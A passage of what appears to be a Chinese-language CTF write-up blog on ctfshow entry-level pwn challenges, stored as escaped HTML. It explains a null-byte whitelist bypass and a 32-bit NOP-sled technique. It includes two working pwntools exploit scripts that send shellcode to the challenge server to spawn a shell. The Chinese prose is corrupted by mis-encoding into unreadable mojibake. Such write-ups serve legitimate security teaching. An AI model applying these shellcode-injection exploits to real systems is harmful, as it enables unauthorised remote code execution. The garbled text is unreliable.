&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28280&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00\xc0&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;\x00\xc0&lt;/code&gt;æ˜¯ **â€œæˆªæ–­æ ¡éªŒ + åˆæ³•æ‰§è¡Œâ€ çš„åŒé‡å·¥å…· **ï¼š&lt;code&gt;\x00&lt;/code&gt;è´Ÿè´£çªç ´&lt;code&gt;check&lt;/code&gt;å‡½æ•°çš„é€å­—èŠ‚ç™½åå•é™åˆ¶ï¼Œ&lt;code&gt;\xc0&lt;/code&gt;è´Ÿè´£ç¡®ä¿æŒ‡ä»¤åˆæ³•ä»¥é¿å…æ‰§è¡Œé”™è¯¯ï¼ŒäºŒè€…ç»„åˆæ˜¯è¯¥é¢˜ç›®ç»•è¿‡å­—ç¬¦åˆæ³•æ€§æ ¡éªŒã€æˆåŠŸæ‰§è¡Œ shellcode çš„æ ¸å¿ƒå…³é”®ã€‚&lt;/p&gt;
&lt;h3 id=&#34;nop-sledç©ºæ“ä½œé›ªæ©‡&#34;&gt;&lt;strong&gt;nop sledç©ºæ“ä½œé›ªæ©‡&lt;/strong&gt;
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;â€œnopâ€ï¼ˆNo Operation çš„ç¼©å†™ï¼‰&lt;/strong&gt;ï¼šæ˜¯ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤ï¼Œåœ¨ 32 ä½ x86 æ¶æ„ä¸‹ï¼Œå…¶æœºå™¨ç ä¸º&lt;code&gt;0x90&lt;/code&gt;ã€‚nop æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼ŒCPU ä¸è¿›è¡Œå®é™…çš„è¿ç®—æˆ–æ•°æ®å¤„ç†æ“ä½œï¼Œä»…å°†ç¨‹åºè®¡æ•°å™¨ï¼ˆå¦‚ 32 ä½æ¶æ„ä¸‹çš„ EIP å¯„å­˜å™¨ï¼‰çš„å€¼å¢åŠ  1ï¼ŒæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œèµ·åˆ°å ä½å’Œä½¿ç¨‹åºæµç¨‹é¡ºåºæ‰§è¡Œçš„ä½œç”¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;â€œsledâ€ï¼ˆé›ªæ©‡ï¼‰&lt;/strong&gt;ï¼šå½¢è±¡åœ°æè¿°äº†æ”»å‡»åŸç†ã€‚é€šè¿‡åœ¨ shellcode å‰é¢å¡«å……å¤§é‡çš„ nop æŒ‡ä»¤ï¼Œå½¢æˆä¸€ä¸ª â€œæŒ‡ä»¤é›ªæ©‡â€ã€‚å½“ç¨‹åºçš„æ‰§è¡Œæµè¢«åŠ«æŒåˆ°è¿™ä¸ª â€œé›ªæ©‡â€ åŒºåŸŸå†…çš„ä»»æ„ä½ç½®æ—¶ï¼Œå°±åƒé›ªæ©‡ä»é«˜å¤„æ»‘ä¸‹ä¸€æ ·ï¼Œç¨‹åºä¼šé¡ºç€ä¸€ä¸ªä¸ª nop æŒ‡ä»¤ä¾æ¬¡æ‰§è¡Œï¼Œæœ€ç»ˆåˆ°è¾¾å¹¶æ‰§è¡Œä½äº â€œé›ªæ©‡â€ åæ–¹çš„ shellcodeã€‚è¿™ä¸€è¿‡ç¨‹å¯ç±»æ¯”ä¸ºåœ¨ä¸ç¡®å®š shellcode ç¡®åˆ‡èµ·å§‹åœ°å€çš„æƒ…å†µä¸‹ï¼Œæ‰©å¤§å¯å‘½ä¸­çš„èŒƒå›´ï¼Œåªè¦è¿”å›åœ°å€èƒ½è½å…¥ nop æŒ‡ä»¤ç»„æˆçš„åŒºåŸŸï¼Œå°±èƒ½ä¿è¯ shellcode è¢«æ‰§è¡Œã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;pwn_067å¾…å®š&#34;&gt;PWN_067*ï¼ˆå¾…å®šï¼‰
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š32bit nop sledï¼› &lt;a class=&#34;link&#34; href=&#34;PWN_067&#34; &gt;PWN_067&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/238.png&#34;
	width=&#34;801&#34;
	height=&#34;234&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/238_hu_e3f1d88191a0ef75.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/238_hu_19041a51464601be.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;æœ‰æ ˆæº¢å‡ºä¿æŠ¤&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;342&#34;
		data-flex-basis=&#34;821px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡åªæœ‰æ ˆæº¢å‡ºä¿æŠ¤äº†ã€‚&lt;/p&gt;
&lt;p&gt;IDA32åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/239.png&#34;
	width=&#34;908&#34;
	height=&#34;466&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/239_hu_55405d1133582b8d.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/239_hu_befde81098e46521.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;194&#34;
		data-flex-basis=&#34;467px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/240.png&#34;
	width=&#34;1296&#34;
	height=&#34;785&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/240_hu_ba20d400cc872dc.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/240_hu_66be74762e913a37.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;165&#34;
		data-flex-basis=&#34;396px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªv5åœ°å€è¢«æ‰“å°è¾“å‡ºï¼Œä½†ä¸€ç›´æ˜¯åŠ¨æ€å˜åŒ–çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä»£ç çš„å¤§æ¦‚æ„æ€æ˜¯å…ˆè¾“å‡ºä¸€äº›ä¿¡æ¯ï¼Œç„¶åè¾“å‡ºçš„ä¼šæœ‰æ ˆä¸­çš„åœ°å€ï¼Œä»query_positionå‡½æ•°å¯ä»¥å‘ç°å‡½æ•°è¿”å›å€¼æ˜¯v1çš„åœ°å€åŠ ä¸Šv2çš„å€¼ï¼Œè€Œv1æ˜¯å±€éƒ¨å˜é‡ï¼Œé‚£ä¹ˆå®ƒçš„åœ°å€å°±æ˜¯æ ˆé‡Œçš„åœ°å€ï¼ŒåŠ ä¸Šv2å°±ä»£è¡¨æ¥æ”¶å‡½æ•°è¿”å›å€¼çš„å˜é‡position=v1çš„åœ°å€+v2çš„å€¼(å³&amp;amp;v1+v2)ã€‚ç„¶åç¨‹åºä¼šè®©æˆ‘ä»¬è¾“å…¥å¤§å°ä¸º4096çš„å­—ç¬¦ä¸²ç»™seedå˜é‡ï¼Œä¹‹åå†è®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œå°†å…¶èµ‹ç»™v5ï¼Œç„¶åä½¿ç”¨v5ä»æˆ‘ä»¬è¾“å…¥çš„è¿™ä¸ªåœ°å€æ‰§è¡Œè¿™ä¸ªåœ°å€çš„ä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;å› æ­¤æˆ‘ä»¬å¯ä»¥ä»å †æ ˆä¸­æ‰§è¡Œã€‚å‘ç¨‹åºæä¾› shellcode å¾ˆå®¹æ˜“ï¼Œå› ä¸ºå®ƒåªè¦æ±‚è¾“å…¥ã€‚ç°åœ¨æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥è·³è½¬åˆ°æˆ‘ä»¬çš„ shellcodeã€‚&lt;/p&gt;
&lt;p&gt;åˆšå¥½æœ‰ä¸ª fgets å¯ä»¥è¯»å– shellcode åˆ° seedï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“ seed çš„åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›query_positionå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241.png&#34;
	width=&#34;610&#34;
	height=&#34;253&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241_hu_b76db1763bd6df64.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241_hu_5afb8f9679a37742.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;query_positionå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;241&#34;
		data-flex-basis=&#34;578px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;char *query_position()&lt;/code&gt; ä½œç”¨æ˜¯&lt;strong&gt;ç”Ÿæˆä¸€ä¸ªåŸºäºéšæœºåç§»çš„æ ˆåœ°å€&lt;/strong&gt;ï¼Œå¾—åˆ°ä¸€ä¸ª&lt;strong&gt;èŒƒå›´åœ¨-668åˆ° 668ä¹‹é—´&lt;/strong&gt;çš„éšæœºæ•´æ•°ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡ v2 ä¸­ã€‚è¯¥åœ°å€åç»­ç”¨äºæ„é€  â€œnop é›ªæ©‡â€ æ”»å‡»ä»¥ç»•è¿‡æ ˆåœ°å€éšæœºæ€§ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°è¿™é‡Œå°±æœ‰ç‚¹å°è±¡äº†ï¼Œè¿™ä¸å°±æ˜¯ç±»ä¼¼ASLRï¼ˆAddress Space Layout Randomizationï¼‰ä¿æŠ¤å—ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¿™é‡Œéœ€è¦äº†è§£ä¸€ä¸‹ nop sled ç©ºæ“ä½œé›ªæ©‡ï¼š&lt;/p&gt;
&lt;p&gt;æ”»å‡»è€…é€šè¿‡è¾“å…¥å­—ç¬¦ä¸²æ³¨å…¥æ”»å‡»ä»£ç ã€‚åœ¨å®é™…çš„æ”»å‡»ä»£ç å‰æ³¨å…¥å¾ˆé•¿çš„ nop æŒ‡ä»¤ï¼ˆæ— æ“ä½œï¼Œä»…ä½¿ç¨‹åºè®¡æ•°å™¨åŠ ä¸€ï¼‰åºåˆ—ï¼Œåªè¦ç¨‹åºçš„æ§åˆ¶æµæŒ‡å‘è¯¥åºåˆ—ä»»æ„ä¸€å¤„ï¼Œç¨‹åºè®¡æ•°å™¨é€æ­¥åŠ ä¸€ï¼Œç›´åˆ°åˆ°è¾¾æ”»å‡»ä»£ç çš„å­˜åœ¨çš„åœ°å€ï¼Œå¹¶æ‰§è¡Œã€‚ç”±äºæ ˆåœ°å€åœ¨ä¸€å®šèŒƒå›´çš„éšæœºæ€§ï¼Œæ”»å‡»è€…ä¸èƒ½å¤ŸçŸ¥é“æ”»å‡»ä»£ç æ³¨å…¥çš„åœ°å€ï¼Œè€Œè¦æ‰§è¡Œæ”»å‡»ä»£ç éœ€è¦å°†å‡½æ•°çš„è¿”å›åœ°å€æ›´æ”¹ä¸ºæ”»å‡»ä»£ç çš„åœ°å€ï¼ˆå¯é€šè¿‡ç¼“å†²åŒºæº¢å‡ºçš„æ–¹å¼æ”¹å†™å‡½æ•°è¿”å›åœ°å€ï¼‰ã€‚æ‰€ä»¥ï¼Œåªèƒ½åœ¨ä¸€å®šèŒƒå›´å†…ï¼ˆæ ˆéšæœºå¯¼è‡´æ”»å‡»ä»£ç åœ°å€ä¸€å®šèŒƒå›´å†…éšæœºï¼‰æšä¸¾æ”»å‡»ä»£ç ä½ç½®ï¼ˆæœ‰ä¾æ®çš„çŒœï¼‰ ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸ç”¨ nop sled ï¼Œ å‡½æ•°è¿”å›åœ°å€ &amp;mdash;&amp;mdash;-&amp;gt; æ”»å‡»ä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ nop sled ï¼Œ å‡½æ•°è¿”å›åœ°å€ &amp;mdash;&amp;mdash;-&amp;gt; nop åºåˆ—ï¼ˆé¡ºåºæ‰§è¡Œï¼‰ ç›´åˆ°æ”»å‡»ä»£ç åœ°å€ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ä¸ºäº†å®‰å…¨åœ°â€œç»•è¿‡â€ä¸çŸ¥é“ç¼“å†²åŒºçš„ç¡®åˆ‡å¼€å§‹ä½ç½®,æˆ‘ä»¬å¯ä»¥ï¼š&lt;/p&gt;
&lt;p&gt;1ã€å°† shellcode å¡«å……ä¸ºä»¥ 1336 nop æ¡æŒ‡ä»¤å¼€å¤´ ( 0x90 )ã€‚&lt;/p&gt;
&lt;p&gt;2ã€ä½¿ç”¨ çš„è¿”å›å€¼ query_position ï¼Œæ·»åŠ  0x2d ï¼ˆå¦‚å‰æ‰€è¿°ï¼‰ï¼Œ&lt;strong&gt;ç„¶åæ·»åŠ &lt;/strong&gt; &lt;strong&gt;668&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;python3è¿è¡Œçš„expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;i386&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;debug&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28120&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;current location: &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;drop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x90&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1336&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¾“è¿›v5çš„åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shell_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;668&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;åœ¨è¿™é‡Œç‰¹åˆ«è§£é‡Šä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shell_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;668&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
